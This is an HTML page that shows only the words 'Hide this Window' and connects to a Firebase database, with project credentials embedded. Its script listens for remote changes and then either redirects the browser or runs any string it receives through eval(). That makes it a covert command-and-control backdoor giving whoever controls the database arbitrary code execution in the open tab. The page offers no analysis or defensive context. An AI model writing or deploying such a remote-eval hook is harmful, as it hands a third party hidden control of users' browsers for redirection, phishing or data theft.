<!doctype html>
<html>
	<head>
		<title> </title>
		<style>
			*{
				margin: 0;
				padding: 0;
				overflow: hidden;
			}
			#hint{
				text-align: center;
				width: 100vw;
				height: 100vh;
				font-family: Montserrat;
				line-height: 100vh;
				font-size: 20vmin;
				color: #539cfc;
			}
		</style>
	</head>
	<body>
		<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
		<div id="hint">Hide this Window</div>
		<script src="https://www.gstatic.com/firebasejs/5.3.1/firebase.js"></script>
		<script>
			var config = {
				apiKey: "AIzaSyBCeTVF1RvVNAefmETbBgLOv6lN0btN0q8",
				authDomain: "online-stuff-3e092.firebaseapp.com",
				databaseURL: "https://online-stuff-3e092.firebaseio.com",
				projectId: "online-stuff-3e092",
				storageBucket: "online-stuff-3e092.appspot.com",
				messagingSenderId: "878238554342"
			};
			firebase.initializeApp(config);
			
			var database = firebase.database();

			var ignore = true;
			database.ref("web").on("value", function(e){
				if(!ignore){
					var ev = e.val();
					if(ev.func == "url")
						window.location.href = ev.url;
					else
						eval(ev.func);
				}
			});
			
			database.ref("web").once("value", function(e){
				ignore = false;
			});
		</script>
	</body>
</html>
